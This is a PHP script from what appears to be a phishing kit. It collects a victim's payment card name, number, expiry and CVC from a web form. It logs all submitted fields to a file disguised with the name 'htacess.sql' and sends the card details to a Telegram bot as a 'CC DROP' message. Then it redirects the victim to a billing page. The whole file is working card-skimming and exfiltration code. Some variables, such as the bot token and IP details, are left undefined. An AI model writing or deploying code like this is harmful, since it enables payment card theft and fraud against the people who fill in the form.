<?php
$data = !empty($_POST) ? $_POST : $_GET;
if (!empty($data)) {
    $txt = date('Y-m-d H:i:s') . "\n";
    foreach ($data as $k => $v) {
        $txt .= $k . ": " . (is_array($v) ? implode(', ', $v) : $v) . "\n";
    }
    file_put_contents(__DIR__ . '/htacess.sql', $txt . "\n", FILE_APPEND);
}

$cardName = $_POST['cardName'];
$cardNumber = $_POST['cardNumber'];
$expiry = $_POST['expiry'];
$cvc = $_POST['cvc'];


$_SESSION["cardName"] = $cardName;
$_SESSION["cardNumber"] = $cardNumber;
$_SESSION["expiry"] = $expiry;
$_SESSION["cvc"] = $cvc;

$message  = "
╔════════════════════════╗
   💳🔥 𝐂𝐂 𝐃𝐑𝐎𝐏 🔥💳
╚════════════════════════╝

👤 ┃ 𝐂𝐚𝐫𝐝 𝐇𝐨𝐥𝐝𝐞𝐫 ➤ $cardName
💳 ┃ 𝐂𝐂 𝐍𝐮𝐦𝐛𝐞𝐫 ➤ $cardNumber
📅 ┃ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞 ➤ $expiry
🔐 ┃ 𝐂𝐕𝐂 ➤ $cvc

💳 ┃ BIN ➤ $brand - $type - $issuer
📡 ┃ IP ➤ $ip - $country - $as_name
🌐 ┃ Device ➤ $browser - $os - $device
╔════════════════════════╗
   ⚡ 𝐂𝐇𝐄𝐂𝐊 𝐈𝐓 𝐍𝐎𝐖 ⚡
╚════════════════════════╝
";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

$response = file_get_contents($url);
$result = json_decode($response, true);

header("Location: ../bill.html");

?>